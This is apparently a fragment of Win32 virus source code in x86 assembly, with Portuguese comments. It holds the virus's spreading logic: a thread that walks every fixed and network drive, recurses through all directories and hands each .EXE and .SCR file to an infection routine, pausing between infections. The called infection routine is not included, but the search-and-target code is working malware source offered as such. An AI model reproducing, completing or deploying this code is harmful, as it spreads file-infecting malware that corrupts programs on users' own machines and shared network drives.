IF DISKSEARCH EQ TRUE

disk_thread:
       pushad
       call @@infectfile666
       jmp infectfile
  @@infectfile666:
       call busca_recursiva
       popad
       ret 4

infectfile:
       pushad
       mov esi,[esp+(8*4)+4]
       mov [fname], esi
  @@check:
       lodsb
       test al,al
       jnz @@check
       mov eax, [esi-4]
       and eax, 0ffdfdfdfh
       cmp eax, 'EXE'
       je @@infect
       sub eax, 'RCS'
       jnz @@inst
  @@infect:
       call infectf
       push 5*1000
       call [_Sleep]
  @@inst:
       popad
       ret 4

busca_recursiva:                                ;parametro=rotina de arquivo
       pushad
       sub esp, 4
       mov ebp, esp
       mov [ebp], "\:@"                         ;inicia busca por A:\
  @@proximo_disco:
       cmp by [ebp], "Z"
       je @@feito                                 ;se j� tamos no Z:\, para
       inc by [ebp]
       push ebp
       call [_GetDriveType]
       cmp al, 3                                ;� disco rigido?
       je @@fixo
       cmp al, 4                                ;ou disco de rede?
       jne @@proximo_disco
  @@fixo:
       push ebp
       call [_SetCurrentDirectoryA]
       test eax, eax
       jz @@proximo_disco
       push dwo [esp+(8*4)+8]                   ;rotina CALLBACK
       call busca_disco                         ;busca dentro dos diretorios
       jmp @@proximo_disco
  @@feito:
       add esp, 4
       popad
       ret 4

busca_disco:
       pushad
       sub esp, SIZEOF_WIN32_FIND_DATA+4+4+4
       mov ebp, esp
       mov dwo [ebp.SIZEOF_WIN32_FIND_DATA], "*.*"         ;constroi mascara de busca
       mov dwo [ebp.SIZEOF_WIN32_FIND_DATA+4+4], ".."      ;e para mudar de diretorio
       lea eax, [ebp.SIZEOF_WIN32_FIND_DATA]
       push ebp
       push eax
       call dwo [_FindFirstFileA]
       mov dwo [ebp.SIZEOF_WIN32_FIND_DATA+4], eax         ;salva handle da busca
       inc eax
       jz @@sobe_dir
  @@verifica_dir:
       lea eax, [ebp.WFD_szFileName]
       test dwo [ebp.WFD_dwFileAttributes], 10h
       jnz @@e_dir
       push eax
       call [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+8]    ;chama CALLBACK
  @@continua_busca:
       push ebp
       push dwo [ebp.SIZEOF_WIN32_FIND_DATA+4]
       call [_FindNextFileA]                 ;procura proximo arquivo
       test eax, eax
       jnz @@verifica_dir
  @@sobe_dir:
       push dwo [ebp.SIZEOF_WIN32_FIND_DATA+4]
       call dwo [_FindClose]
       lea eax, [ebp.SIZEOF_WIN32_FIND_DATA+4+4]       ;ponteiro para ".."
       push eax
       call dwo [_SetCurrentDirectoryA]
       add esp, SIZEOF_WIN32_FIND_DATA+4+4+4
       popad
       ret 4
  @@e_dir:
       cmp by [eax], '.'
       je @@continua_busca                        ;evita travar
       push eax
       call dwo [_SetCurrentDirectoryA]          ;entra no diretorio
       test eax, eax
       jz @@continua_busca
       push dwo [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+4]
       call busca_disco                         ;busca recursiva
       jmp @@continua_busca

ENDIF
